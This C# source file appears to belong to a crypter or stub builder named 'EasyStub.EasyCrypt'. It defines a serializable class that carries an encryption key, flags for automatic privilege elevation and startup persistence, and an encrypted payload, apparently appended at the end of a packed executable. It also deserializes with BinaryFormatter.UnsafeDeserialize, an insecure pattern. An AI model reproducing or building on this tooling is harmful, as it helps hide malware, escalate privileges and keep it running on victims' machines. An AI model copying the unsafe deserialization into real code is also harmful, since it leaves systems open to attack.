﻿using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;

namespace EasyStub.EasyCrypt.Core
{
    [Serializable]
    public class EofData
    {
        public string EncryptionKey;
        public bool AutomaticElevation;
        public bool AutomaticStartup;
        public byte[] EncryptedPayload;

        public void Serialize(Stream stream)
        {
            BinaryFormatter binaryFormatter = new BinaryFormatter();
            binaryFormatter.Serialize(stream, this);
        }

        public static EofData Deserialize(Stream stream)
        {
            BinaryFormatter binaryFormatter = new BinaryFormatter();
            return (EofData)binaryFormatter.UnsafeDeserialize(stream, null);
        }
    }
}
